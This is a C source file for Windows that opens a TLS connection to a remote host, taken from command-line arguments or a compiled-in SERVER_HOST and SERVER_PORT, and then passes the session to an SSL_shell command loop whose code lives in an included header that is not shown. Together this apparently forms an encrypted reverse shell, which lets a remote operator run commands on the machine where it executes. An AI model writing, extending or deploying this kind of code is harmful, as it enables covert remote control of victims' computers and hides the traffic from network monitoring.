#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

#include "shell.h"

SSL_CTX *create_context()
{
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    method = TLS_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx)
    {
        fprintf(stderr, "SSL_CTX_new failed\n");
        exit(EXIT_FAILURE);
    }

    return ctx;
}

int main(int argc, char **argv)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        fprintf(stderr, "WSAStartup error\n");
        exit(EXIT_FAILURE);
    }

    SOCKET sock = INVALID_SOCKET;
    SSL_CTX *ctx;
    SSL *ssl;

    // create SSL context
    printf("\nCreating SSL context\n");
    ctx = create_context();
    SSL_CTX_set_ecdh_auto(ctx, 1);

    // create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        fprintf(stderr, "Socket creation failed\n");
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    // set up socket information
    struct sockaddr_in serveraddr;
    memset(&serveraddr, 0, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;

    if (argc == 3)
    {
        serveraddr.sin_port = htons(atoi(argv[2]));
        inet_pton(AF_INET, argv[1], &(serveraddr.sin_addr));
    }
    else
    {
        printf("Using compile definitions SERVER_HOST:%s SERVER_PORT:%s\n", SERVER_HOST, SERVER_PORT);
        serveraddr.sin_port = htons(atoi(SERVER_PORT));
        inet_pton(AF_INET, SERVER_HOST, &(serveraddr.sin_addr));
    }

    // connect to the server
    if (connect(sock, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) == SOCKET_ERROR)
    {
        fprintf(stderr, "Connection failed\n");
        closesocket(sock);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    // create SSL object and bind to socket
    printf("\nAttempting to initialize SSL\n");
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    // perform SSL handshake
    printf("Performing SSL handshake\n");
    if (SSL_connect(ssl) <= 0)
    {
        fprintf(stderr, "SSL handshake failed\n");
        SSL_free(ssl);
        closesocket(sock);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    // start command loop
    SSL_shell(ssl);

    // cleanup
    SSL_shutdown(ssl);
    SSL_free(ssl);
    closesocket(sock);
    SSL_CTX_free(ctx);
    WSACleanup();

    return 0;
}
